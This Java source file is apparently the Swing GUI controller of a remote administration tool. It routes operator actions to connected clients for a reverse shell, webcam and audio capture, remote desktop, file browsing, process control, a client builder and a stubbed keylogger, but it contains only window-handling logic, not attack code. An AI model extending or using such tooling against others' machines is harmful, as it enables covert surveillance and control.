package com.melardev.xeytanj.gui.mediator.swing;

import com.melardev.xeytanj.concurrent.communicators.GuiCommunicator;
import com.melardev.xeytanj.concurrent.communicators.reactive.twoway.ui.GuiAndBackgroundReactiveCommunicator;
import com.melardev.xeytanj.concurrent.messaging.events.AppEvent;
import com.melardev.xeytanj.concurrent.messaging.events.ClientAppEvent;
import com.melardev.xeytanj.enums.Action;
import com.melardev.xeytanj.enums.*;
import com.melardev.xeytanj.errors.NotOpenedWindowException;
import com.melardev.xeytanj.gui.IGui;
import com.melardev.xeytanj.gui.IGuiUserOwned;
import com.melardev.xeytanj.gui.builder.BuilderGUI;
import com.melardev.xeytanj.gui.camera.CameraGUI;
import com.melardev.xeytanj.gui.chat.ChatGUI;
import com.melardev.xeytanj.gui.desktop.RemoteDesktopGui;
import com.melardev.xeytanj.gui.disclaimer.DisclaimerDialog;
import com.melardev.xeytanj.gui.filesystem.FileSystemGui;
import com.melardev.xeytanj.gui.info.InfoGUI;
import com.melardev.xeytanj.gui.language.GUILanguages;
import com.melardev.xeytanj.gui.main.MainGui;
import com.melardev.xeytanj.gui.mediator.IUiMediator;
import com.melardev.xeytanj.gui.notify.ConnectionFrame;
import com.melardev.xeytanj.gui.notify.DialogFactory;
import com.melardev.xeytanj.gui.preferences.GUIPreferences;
import com.melardev.xeytanj.gui.process.ProcessListGui;
import com.melardev.xeytanj.gui.shell.ShellGUI;
import com.melardev.xeytanj.maps.MapsBrowser;
import com.melardev.xeytanj.models.*;
import com.melardev.xeytanj.services.IAppMessages;
import com.melardev.xeytanj.services.logger.ILogger;
import org.springframework.stereotype.Service;

import javax.swing.*;
import java.util.*;
import java.util.function.Function;
import java.util.function.Predicate;
import java.util.stream.Collectors;


@Service
public class SwingMediator implements IUiMediator {

    private final UUID rootId;

    Map<UUID, List<WindowInfoStructure>> openedWindows;

    private Integer id;
    private IAppMessages messageProvider;
    private ILogger logger;
    private GuiCommunicator communicator;
    private GuiAndBackgroundReactiveCommunicator rxCommunicator;

    public SwingMediator() {
        id = 0;
        openedWindows = new HashMap<>();
        rootId = UUID.randomUUID();
    }

    @Override
    public void setMessageProvider(IAppMessages messageProvider) {
        this.messageProvider = messageProvider;
    }

    @Override
    public void showLanguageSelectorDialog() {
        // TODO: Change by IDisclaimerDialog
        logger.traceCurrentMethodName();
        IGui dlg = new GUILanguages();
        buildAndShow(dlg);
    }


    @Override
    public void showDisclaimerDialog() {
        logger.traceCurrentMethodName();
        DisclaimerDialog dlg = new DisclaimerDialog();
        buildAndShow(dlg);
    }

    @Override
    public void showInstaller() {
        logger.traceCurrentMethodName();
    }

    @Override
    public void showDialogMessageError(String message) {
        logger.traceCurrentMethodName();
        JOptionPane.showConfirmDialog(null, message,
                "Error", JOptionPane.ERROR_MESSAGE);
    }

    @Override
    public void showMainFrame() {
        logger.traceCurrentMethodName();
        MainGui gui = new MainGui();
        gui.setMessageProvider(messageProvider);
        buildAndShow(gui);
    }

    private WindowInfoStructure buildAndShow(IGui gui) {
        return buildAndShow(null, gui);
    }

    public void showClientInfo(Client client, Map<String, String> envMap, Map<String, String> properties) {
        logger.traceCurrentMethodName();
        InfoGUI gui = new InfoGUI();

        String envStr = envMap.entrySet().stream().map(Object::toString).collect(Collectors.joining("<br/>"));
        String basic = client.getLocalIp() + " " + client.getGlobalIp();
        String propsStr = properties.entrySet().stream().map(Object::toString).collect(Collectors.joining("<br />"));
        gui.setData(basic, envStr, propsStr);

        WindowInfoStructure w = buildShowAndAssignToOwner(client, gui);

    }

    @Override
    public void addClientRowTable(Client client) {
        showNewClientNotification(client);
        logger.traceCurrentMethodName();
        MainGui window = getOpenedWindow(rootId, MainGui.class);
        window.addClient(client);
    }

    @Override
    public void showNewClientNotification(Client client) {
        logger.traceCurrentMethodName();
        String country = client.getGeoData().getCountry();
        String os = client.getOs();

        /*
        if (country == null || country.isEmpty())
            country = "Morocco";
        */

        country = "Morocco";
        String ctr = "icons/flags/" + country + ".png";
        String osIconPath = "";
        if (os.toLowerCase().contains("windows"))
            osIconPath = "icons/os/windows_32.png";
        else if (os.toLowerCase().contains("android"))
            osIconPath = "icons/os/android_48.png";
        else if (os.toLowerCase().contains("linux"))
            osIconPath = "icons/os/linux_32.png";

        //new Thread(() -> DialogFactory.getFrame(FrameType.NEW_CONNECTION, ctr, o, pcName, globalIp)).initServer();
        String finalOsIconPath = osIconPath;
        new Thread(() -> ((ConnectionFrame) DialogFactory.getFrame(DialogFactory.FrameType.NEW_CONNECTION))
                .setPCName(client.getPcName())
                .setIconFlag(ctr).setIconOS(finalOsIconPath).setIP(client.getGlobalIp())
                .animate())
                .start();
    }

    @Override
    public void removeClientRow(Client client) {
        logger.traceCurrentMethodName();
        MainGui gui = getOpenedWindow(rootId, MainGui.class);
        gui.deleteRow(client.getId());
    }

    @Override
    public <T> void onWindowClose(IGui gui) {
        logger.trace("Closed " + gui.getClass());
        WindowInfoStructure w = getWindowInfoFromOpenedWindow(rootId, gui.getClass());
        openedWindows.get(rootId).remove(w);

    }

    @Override
    public <T> void onWindowUserOwnedClose(Client client, IGuiUserOwned gui, Subject subject) {
        logger.trace("Closed " + gui.getClass());
        WindowInfoStructure w = getOpenedWindowFromClient(client, gui.getClass());
        if (w == null)
            return;
        List<WindowInfoStructure> windowsFromUser = openedWindows.get(client.getId());
        windowsFromUser.remove(w);

        rxCommunicator.queueToBackgroundAsync(buildClientAppEvent(client, subject, Action.STOP));
        w = null;
        if (windowsFromUser.size() == 0)
            openedWindows.remove(client.getId());

    }

    @Override
    public void updateProcessInfoWindow(Client client, List<ProcessStructure> processStructures) {
        //getOpenedWindowFromClient(clientId, Process)
        logger.traceCurrentMethodName();
        IGuiUserOwned gui = new ProcessListGui();
        WindowInfoStructure w = buildShowAndAssignToOwner(client, gui);
        ((ProcessListGui) gui).populateTable(processStructures);
    }

    @Override
    public void showShellWindow(Client client) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = buildShowAndAssignToOwner(client, new ShellGUI());
    }

    @Override
    public void appendShellOutput(Client clientId, String text) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(clientId, ShellGUI.class);
        if (w == null) {
            ShellGUI gui = new ShellGUI();
            w = buildShowAndAssignToOwner(clientId, gui);
        }
        ((ShellGUI) w.getFrame()).appendText(text);
    }

    @Override
    public void notifyShellWindowDisconnectedForClient(Client clientId) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(clientId, ShellGUI.class);
        if (w == null)
            return;

        ((ShellGUI) w.getFrame()).notifyDisconnected();
    }

    @Override
    public void notifyCameraSessionClosedForClient(Client clientId) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(clientId, CameraGUI.class);
        if (w == null || w.getFrame() == null)
            return;
        CameraGUI gui = (CameraGUI) w.getFrame();
        gui.setStatus("User is disconnected");
    }

    @Override
    public void showFileExplorerWindow(Client clientId) {
        logger.traceCurrentMethodName();
        buildShowAndAssignToOwner(clientId, new FileSystemGui());
    }

    @Override
    public void updateFileSystemView(Client clientId, FileInfoStructure[] fileInfoStructures) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(clientId, FileSystemGui.class);
        if (w == null || w.getFrame() == null)
            return;
        ((FileSystemGui) w.getFrame()).updateFilesystemView(fileInfoStructures);
    }

    @Override
    public void playAudioFromCamera(Client clientId, byte[] data, int bytesRead) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(clientId, CameraGUI.class);
        if (w == null || w.getFrame() != null)
            return;
        ((CameraGUI) w.getFrame()).playAudio(data, bytesRead);
    }

    @Override
    public void playAudioFile(Client clientId, byte[] data) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(clientId, CameraGUI.class);
        if (w == null || w.getFrame() == null)
            return;

        ((CameraGUI) w.getFrame()).playAudio(data, data.length);
    }

    @Override
    public void showChatMessage(Client client, String message) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(client, ChatGUI.class);
        if (w == null || w.getFrame() == null) {
            w = buildShowAndAssignToOwner(client, new ChatGUI());
        }

        ((ChatGUI) w.getFrame()).appendMsg(message);
    }

    @Override
    public void showChatWindow(Client client) {
        logger.traceCurrentMethodName();
        buildShowAndAssignToOwner(client, new ChatGUI());
    }


    private <T extends IGui> T getOpenedWindow(Class<T> uiClazz) {
        logger.traceCurrentMethodName();
        return getOpenedWindow(rootId, uiClazz);
    }

    @Override
    public void onProcessKillRequest(Client id, int pid) {
        logger.traceCurrentMethodName();
        // rxCommunicator.queueToBackgroundAsync(buildClientAppEvent(id, ));
        // application.onProcessKillRequest(id, pid);
    }


    public void showRemoteDesktopWindow(Client client) {
        logger.traceCurrentMethodName();
        RemoteDesktopGui gui = new RemoteDesktopGui();
        WindowInfoStructure info = buildShowAndAssignToOwner(client, gui);
    }

    public void updateRemoteDesktopWindow(Client client, ImageIcon image) {
        logger.traceCurrentMethodName();
        WindowInfoStructure windowInfoStructure = getOpenedWindowFromClient(client, RemoteDesktopGui.class);
        RemoteDesktopGui gui = (RemoteDesktopGui) windowInfoStructure.getFrame();
        gui.setDesktopImage(image);
    }

    private <T extends IGui> WindowInfoStructure getOpenedWindowFromClient(Client client, Class<T> guiClasswindowClass) {
        return getOpenedWindowFromClient(client.getId(), guiClasswindowClass);
    }


    @Override
    public void showOrUpdateRemoteDesktopConfigInfo(Client client, List<ScreenDeviceInfo> config) {
        logger.traceCurrentMethodName();
        WindowInfoStructure window = getOpenedWindowFromClient(client.getId(), RemoteDesktopGui.class);
        RemoteDesktopGui gui = null;
        if (window == null) {
            gui = new RemoteDesktopGui();
            window = buildShowAndAssignToOwner(client, gui);
        } else
            gui = (RemoteDesktopGui) window.getFrame();

        gui.setConfig(config);
    }

    @Override
    public void closeRemoteDesktopWindow(Client clientId) {
        logger.traceCurrentMethodName();
        WindowInfoStructure window = getOpenedWindowFromClient(clientId, RemoteDesktopGui.class);
    }

    @Override
    public void showRemoteDesktopWindow(Client client, boolean reuseifAvailable) {
        logger.traceCurrentMethodName();
        WindowInfoStructure rdp = getOpenedWindowFromClient(client.getId(), RemoteDesktopGui.class);
        if (rdp != null)
            rdp.getFrame().resetState();
        else {
            buildShowAndAssignToOwner(client, new RemoteDesktopGui());
        }
    }

    @Override
    public void showCameraWindow(Client client) {
        logger.traceCurrentMethodName();
        WindowInfoStructure rdp = getOpenedWindowFromClient(client.getId(), CameraGUI.class);
        if (rdp != null)
            rdp.getFrame().resetState();
        else
            buildShowAndAssignToOwner(client, new CameraGUI());
    }

    @Override
    public void showOrUpdateCameraUi(Client client, List<CameraDeviceInfo> availableCameras) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(client.getId(), CameraGUI.class);
        if (w == null) {
            CameraGUI cameraGui = new CameraGUI();
            w = buildShowAndAssignToOwner(client, cameraGui);
        }

        ((CameraGUI) w.getFrame()).updateUi(availableCameras);
    }

    @Override
    public void showOrUpdateCameraUi(Client clientId, Icon image) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(clientId, CameraGUI.class);
        if (w == null)
            return;

        ((CameraGUI) w.getFrame()).updateUi(image);
    }

    @Override
    public void showRoots(Client client, FileInfoStructure[] fileInfoStructures) {
        logger.traceCurrentMethodName();
        WindowInfoStructure w = getOpenedWindowFromClient(client, FileSystemGui.class);
        if (w == null) {
            FileSystemGui gui = new FileSystemGui();
            w = buildShowAndAssignToOwner(client, gui);
        }
        ((FileSystemGui) w.getFrame()).showRoots(fileInfoStructures);
    }

    @Override
    public void closeAllUserOwnedWindows(Client client) {
        logger.traceCurrentMethodName();
        List<WindowInfoStructure> guis = getOpenedWindowsFromClient(client);
        guis.forEach(gui -> {
            gui.getFrame().dispose();
        });
        openedWindows.remove(client.getId());
    }

    private List<WindowInfoStructure> getOpenedWindowsFromClient(Client clientId) {
        logger.traceCurrentMethodName();
        return openedWindows.get(clientId.getId());
    }

    private <T extends IGuiUserOwned> WindowInfoStructure buildShowAndAssignToOwner(Client client, T gui) {
        logger.traceCurrentMethodName();
        WindowInfoStructure info = buildAndShow(client, gui);
        info.setIdBelongsTo(client.getId());
        ((IGuiUserOwned) info.getFrame()).setClient(client);
        return info;
    }

    private WindowInfoStructure buildAndShow(Client client, IGui gui) {
        logger.traceCurrentMethodName();
        WindowInfoStructure windowInfoStructure = new WindowInfoStructure(0, gui, this);
        gui.addListener(this);
        gui.setMediator(this);
        gui.setMessageProvider(messageProvider);
        gui.display();

        UUID clientId = client == null ? rootId : client.getId();

        if (openedWindows.containsKey(clientId))
            openedWindows.get(clientId).add(windowInfoStructure);
        else {
            LinkedList<WindowInfoStructure> list = new LinkedList<>();
            list.add(windowInfoStructure);
            openedWindows.put(clientId, list);
        }
        return windowInfoStructure;
    }


    @Override
    public void onLanguageSelected(Language lang) {
        logger.traceCurrentMethodName();
        WindowInfoStructure dlg = getWindowInfoFromOpenedWindow(rootId, GUILanguages.class);
        // application.onLanguageSelected(lang);
        AppEvent event = new AppEvent();
        // event.setTarget();
        // dlg.getFrame().dispose();
    }

    @Override
    public void onLanguageUiClosed() {
        logger.traceCurrentMethodName();

    }

    @Override
    public void onDisclaimerAccepted() {
        logger.traceCurrentMethodName();
        WindowInfoStructure dlg = getWindowInfoFromOpenedWindow(rootId, DisclaimerDialog.class);
        dlg.getFrame().dispose();
    }


    @Override
    public void onDisclaimerRefused() {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onExitRequested() {
        logger.traceCurrentMethodName();
    }

    @Override
    public void getClientInfo(Client client) {
        logger.traceCurrentMethodName();
        rxCommunicator.queueToBackgroundAsync(buildClientAppEvent(client, Subject.CLIENT_INFORMATION, Action.START));
    }

    @Override
    public void onRemoteShellClicked(Client client) {
        logger.traceCurrentMethodName();
        rxCommunicator.queueToBackgroundAsync(buildClientAppEvent(client, Subject.REVERSE_SHELL, Action.START));
    }

    @Override
    public void onSendShellCommandRequested(Client client, String command) {
        logger.traceCurrentMethodName();
        rxCommunicator.queueToBackgroundAsync(buildClientAppEvent(client,
                Subject.REVERSE_SHELL, Action.UPDATE, command));
    }

    @Override
    public void onProcessListClicked(ProcessInfoDetails infoLevel, Client client) {
        logger.traceCurrentMethodName();
        AppEvent event = buildClientAppEvent(client, Subject.PROCESS, Action.START);
        event.setObject(infoLevel);
        rxCommunicator.queueToBackgroundAsync(event);
    }

    @Override
    public void onMenuCameraClicked(NetworkProtocol protocol, Client client) {
        logger.traceCurrentMethodName();
        rxCommunicator.queueToBackgroundAsync(buildClientAppEvent(client, Subject.CAMERA, Action.INIT));
    }

    @Override
    public void onRemoteDesktopClicked(Client client) {
        logger.traceCurrentMethodName();
        rxCommunicator.queueToBackgroundAsync(buildClientAppEvent(client, Subject.DESKTOP, Action.INIT));
    }


    @Override
    public void onTurnOnOffDisplayClicked(Client id, boolean on) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onRebootClicked(Client id) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onShutdownClicked(Client id) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onLogOffSystem(Client id) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onLockSystemClicked(Client id) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onSessionKeyloggerClicked(Client id) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onVoIpRawClicked(Client id) {
        logger.traceCurrentMethodName();
    }

    @Override
    public void onVoIpClicked(Client id) {
        logger.traceCurrentMethodName();
    }


    @Override
    public void showBuilderWindow(String defaultOutputPath) {
        logger.traceCurrentMethodName();
        BuilderGUI gui = new BuilderGUI();
        gui.setDefaultOutputPath(defaultOutputPath);
        buildAndShow(gui);
    }

    @Override
    public void onBuildRequested(BuildClientInfoStructure buildClientInfoStructure) {
        logger.traceCurrentMethodName();
        // application.onBuildClientRequested(buildClientInfoStructure);
    }

    @Override
    public void onBuilderShowClicked() {
        logger.traceCurrentMethodName();
        // application.onBuilderShowClicked();
    }

    @Override
    public void closeBuilderUi() {
        logger.traceCurrentMethodName();
        BuilderGUI gui = getOpenedWindow(BuilderGUI.class);
        gui.dispose();
    }

    @Override
    public void setLogger(ILogger logger) {
        this.logger = logger;
    }

    @Override
    public void showErrorMessage(String message) {
        showErrorMessage("Error", message);
    }

    @Override
    public void showErrorMessage(String title, String message) {
        showMessage(title, message, JOptionPane.ERROR_MESSAGE);
    }

    @Override
    public void showMapRequested() {
        // application.onShowMapRequested();
    }

    @Override
    public void showMap(String googleKey, ArrayList<Client> locations) {

        MapsBrowser mapUi = new MapsBrowser();
        mapUi.setClientLocations(locations);
        mapUi.setGoogleMapsKey(googleKey);
        buildAndShow(mapUi);
    }

    @Override
    public void setCommunicator(GuiCommunicator communicator) {
        this.communicator = communicator;
    }

    @Override
    public void setCommunicator(GuiAndBackgroundReactiveCommunicator guiAndBackgroundReactiveCommunicator) {
        this.rxCommunicator = guiAndBackgroundReactiveCommunicator;
    }

    public void showMessage(String title, String message, int messageType) {
        SwingUtilities.invokeLater(() -> {
            JOptionPane.showMessageDialog(null, message, title, messageType);
        });
    }

    @Override
    public void onPreferencesClicked() {
        logger.traceCurrentMethodName();
        new GUIPreferences().display();
    }


    @Override
    public void onCameraStartRequested(NetworkProtocol protocol, Client id) {
        rxCommunicator.queueToBackgroundAsync(buildClientAppEvent(id, Subject.CAMERA, Action.INIT));
    }

    @Override
    public void onRdpStopBtnClicked(Client client) {
        logger.traceCurrentMethodName();
        ClientAppEvent clientEvent = buildClientAppEvent(client, Subject.DESKTOP, Action.STOP);
        rxCommunicator.queueToBackgroundAsync(clientEvent);
    }


    @Override
    public void onRdpPauseBtnCliked(Client client) {
        logger.traceCurrentMethodName();
        WindowInfoStructure window = getOpenedWindowFromClient(client, RemoteDesktopGui.class);
        rxCommunicator.queueToBackgroundAsync(buildClientAppEvent(client, Subject.DESKTOP, Action.PAUSE));
    }

    @Override
    public void onRdpPlayBtnClicked(Client client, NetworkProtocol networkProtocol, String displayName, int scaleX, int scaleY, int delay) {
        logger.traceCurrentMethodName();
        MediaConfigState config = new MediaConfigState(new String[]{displayName});
        config.setScaleX(scaleX);
        config.setScaleY(scaleY);
        config.setDelay(delay);
        config.setInterval(delay);
        ClientAppEvent event = buildClientAppEvent(client, Subject.DESKTOP, Action.START);
        event.setObject(config);
        rxCommunicator.queueToBackgroundAsync(event);
    }

    private <T extends IGui> WindowInfoStructure getOpenedWindowFromClient(UUID clientId, Class<T> guiClass) {
        logger.traceCurrentMethodName();
        List<WindowInfoStructure> windows = openedWindows.get(clientId);
        if (windows == null)
            return null;
        return windows.stream().filter(new Predicate<WindowInfoStructure>() {
            @Override
            public boolean test(WindowInfoStructure windowInfoStructure) {
                return windowInfoStructure.getFrame().getClass() == guiClass
                        && windowInfoStructure.getIdBelongsTo() != null &&
                        windowInfoStructure.getIdBelongsTo() == clientId;
            }
        }).findFirst().orElse(null);
    }

    private <T extends IGui> WindowInfoStructure getWindowInfoFromOpenedWindow(UUID id, Class<T> clazz) {
        logger.traceCurrentMethodName();
        return openedWindows.get(id).stream().filter(new Predicate<WindowInfoStructure>() {
            @Override
            public boolean test(WindowInfoStructure windowsInfoStructure) {
                return windowsInfoStructure.getFrame().getClass() == clazz;
            }
        }).findFirst().orElseThrow(NotOpenedWindowException::new);
    }

    private <T extends IGui> T getOpenedWindow(UUID id, Class<T> clazz) {
        logger.traceCurrentMethodName();
        return openedWindows.get(id).stream().filter(new Predicate<WindowInfoStructure>() {
            @Override
            public boolean test(WindowInfoStructure windowsInfoStructure) {
                return windowsInfoStructure.getFrame().getClass() == clazz;
            }
        }).map(new Function<WindowInfoStructure, T>() {
            @Override
            public T apply(WindowInfoStructure windowsInfoStructure) {
                return (T) windowsInfoStructure.getFrame();
            }
        }).findFirst().orElseThrow(NotOpenedWindowException::new);
    }

    @Override
    public void onCameraPlayClicked(Client client, NetworkProtocol protocol, int cameraId, boolean shouldRecordAudio, int interval) {
        logger.traceCurrentMethodName();

        ClientAppEvent event = buildClientAppEvent(client, Subject.CAMERA, Action.START);

        MediaConfigState configMedia = new MediaConfigState(new String[]{String.valueOf(cameraId)});

        event.setObject(configMedia);
        rxCommunicator.queueToBackgroundAsync(event);

    }

    @Override
    public void onCameraPauseClicked(Client client) {
        rxCommunicator.queueToBackgroundAsync(buildClientAppEvent(client, Subject.CAMERA, Action.PAUSE));
    }

    @Override
    public void onRemoteFileManagerClicked(Client client) {
        logger.traceCurrentMethodName();
        rxCommunicator.queueToBackgroundAsync(buildClientAppEvent(client, Subject.FILESYSTEM, Action.INIT));
    }

    @Override
    public void onFileSystemPathRequested(Client id, String fileSystemPath) {
        logger.traceCurrentMethodName();
        rxCommunicator.queueToBackgroundAsync(buildClientAppEvent(id, Subject.FILESYSTEM,
                Action.START, fileSystemPath));
    }


    public void playRaw(UUID id, byte[] data, int bytesRead) {/*
        WindowInfoStructure w = getOpenedWindowFromClient(id, com.melardev.gui.sound.AudioMediaPlayer);
        if (w != null && w.getFrame() != null)
            ((AudioMediaPlayer) w.getFrame()).playRaw(data,bytesRead);*/
    }


    @Override
    public void onStartChatRequested(Client client) {
        logger.traceCurrentMethodName();
        rxCommunicator.queueToBackgroundAsync(buildClientAppEvent(client, Subject.CHAT, Action.START));
    }

    @Override
    public void onSendChatMessage(Client client, String text) {
        logger.traceCurrentMethodName();
        rxCommunicator.queueToBackgroundAsync(buildClientAppEvent(client, Subject.CHAT, Action.UPDATE, text));
    }


    private ClientAppEvent buildClientAppEvent(Client client, Subject intent, Action action) {
        return buildClientAppEvent(client, intent, action, null);
    }

    private ClientAppEvent buildClientAppEvent(Client client, Subject intent, Action action, Object object) {
        ClientAppEvent event = new ClientAppEvent(client);
        event.setSubject(intent);
        event.setAction(action);
        event.setObject(object);
        return event;
    }

    @Override
    public void onEvent(AppEvent event) {
        Action action = event.getAction();
        Target target = event.getTarget();
        Subject subject = event.getSubject();
        Object object = event.getObject();

        if (target == Target.APPLICATION) {
            /*
            if (communicator != null) // Not used, I improved the code to rxCommunicator
                    communicator.dispatchToBackground(new MainGuiEvent("Received !!"));
             */

            if (action == Action.START) {
                showMainFrame();
            }
        } else if (target == Target.SERVER) {

        } else if (target == Target.CLIENT) {
            ClientAppEvent clientEvent = (ClientAppEvent) event;
            Client client = clientEvent.getClient();
            UUID uuid = client.getId();

            if (subject == Subject.FILESYSTEM) {
                if (action == Action.START)
                    showRoots(client, (FileInfoStructure[]) object);
                else if (action == Action.UPDATE)
                    updateFileSystemView(client, (FileInfoStructure[]) object);

            } else if (subject == Subject.REVERSE_SHELL) {
                if (action == Action.UPDATE)
                    appendShellOutput(client, (String) object);
                else if (action == Action.STOP)
                    notifyShellWindowDisconnectedForClient(client);

            } else if (subject == Subject.CAMERA) {
                if (action == Action.INIT)
                    showOrUpdateCameraUi(client, (List<CameraDeviceInfo>) object);
                else if (action == Action.UPDATE)
                    showOrUpdateCameraUi(client, (Icon) object);
            } else if (subject == Subject.DESKTOP) {
                // TODO: Receive config
                if (action == Action.START) {

                } else if (action == Action.STOP) {
                    closeRemoteDesktopWindow(client);
                } else if (action == Action.UPDATE) {
                    updateRemoteDesktopWindow(client, (ImageIcon) object);
                }
            } else if (subject == Subject.DESKTOP_CONFIG) {
                showOrUpdateRemoteDesktopConfigInfo(client, (List<ScreenDeviceInfo>) object);
            } else if (subject == Subject.CLIENT_INFORMATION) {
                if (action == Action.START)
                    showClientInfo(client,
                            // Yeah its ugly, but I deal with it for now, in the future I may refactor this
                            ((List<Map<String, String>>) object).get(0),
                            ((List<Map<String, String>>) object).get(1));

            } else if (subject == Subject.CONNECTION) {
                if (action == Action.START)
                    addClientRowTable(client);
                if (action == Action.STOP)
                    removeClientRow(client);
            } else if (subject == Subject.PROCESS) {
                if (action == Action.UPDATE)
                    updateProcessInfoWindow(client, (List<ProcessStructure>) object);
            } else if (subject == Subject.CHAT) {
                if (action == Action.UPDATE)
                    showChatMessage(client, (String) object);
            }
        }
    }
}
